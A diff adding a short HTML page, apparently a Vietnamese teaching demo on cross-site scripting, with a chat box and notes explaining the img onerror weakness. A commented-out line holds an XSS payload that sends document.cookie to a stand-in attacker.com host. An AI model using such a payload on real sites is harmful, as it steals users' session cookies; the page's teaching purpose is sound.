@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Tấn công XSS và cách phòng tránh</title>
+</head>
+<body>
+  <!-- <img src="invalid-url" onerror="alert('XSS Attack!'); document.location='http://attacker.com/steal?cookie='+document.cookie"> -->
+
+  Điểm yếu: Thuộc tính onerror cho phép thực thi JavaScript khi ảnh không load được. 
+  <br>
+  Nếu attacker có thể kiểm soát nội dung của thuộc tính này, họ có thể inject mã độc.
+  <ul id="messages">
+    <!-- content -->
+  </ul>
+    <input type="text" id="chat-input">
+    <button id="submit">chat</button>
+  <script src="./main.js"></script>
+</body>
+</html>
